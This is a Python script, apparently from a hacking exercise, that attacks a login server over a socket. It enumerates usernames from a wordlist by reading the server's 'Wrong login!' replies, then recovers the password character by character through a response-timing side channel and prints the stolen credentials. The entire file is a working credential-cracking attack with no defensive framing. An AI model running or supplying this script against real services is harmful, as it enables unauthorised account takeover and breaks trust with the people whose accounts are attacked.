import socket
import string
import itertools
import json
import argparse
import time


# connecting the file with logins
def reading_file(path_):
    f = open(path_, 'r')
    logins_ = f.read().split("\n")
    return logins_


def send_receive(socket_, msg_):
    data = json.dumps(msg_, indent=4).encode()
    # sending through socket
    socket_.send(data)
    response = socket_.recv(1024)
    response_py = json.loads(response.decode())
    return response_py


# adding arguments for parsing
parser = argparse.ArgumentParser(description="Script to hack weakly protected website")
parser.add_argument("hostname")
parser.add_argument("port")
args = parser.parse_args()
hostname = args.hostname
port = int(args.port)

# reading the file with logins as a list of strings
path = "hacking\\logins.txt"
logins = reading_file(path)

# establishing connection
with socket.socket() as my_socket:
    my_socket.connect((hostname, port))
    # hacking the login
    for i in logins:
        message_1 = {"login": i, "password": ' '}
        login_status = send_receive(my_socket, message_1)
        if login_status != {"result": "Wrong login!"}:
            login = ''.join(i)

    # hacking the password
    numbers = '0123456789'
    password = ''
    pass_status = {}
    while pass_status != {'result': "Connection success!"}:
        password_iterator = itertools.product(string.ascii_letters + numbers, repeat=1)
        for j in password_iterator:
            letter = ''.join(j)
            message_2 = {"login": login, "password": password + letter}
            send_time = time.perf_counter()
            try:
                pass_status = send_receive(my_socket, message_2)
                receive_time = time.perf_counter()
            except ConnectionResetError:
                pass
            except ConnectionAbortedError:
                pass
            if receive_time - send_time >= 0.1:
                password += letter
            elif pass_status == {'result': "Connection success!"}:
                password += letter
                break

print(json.dumps({"login": login, "password": password}, indent=4))
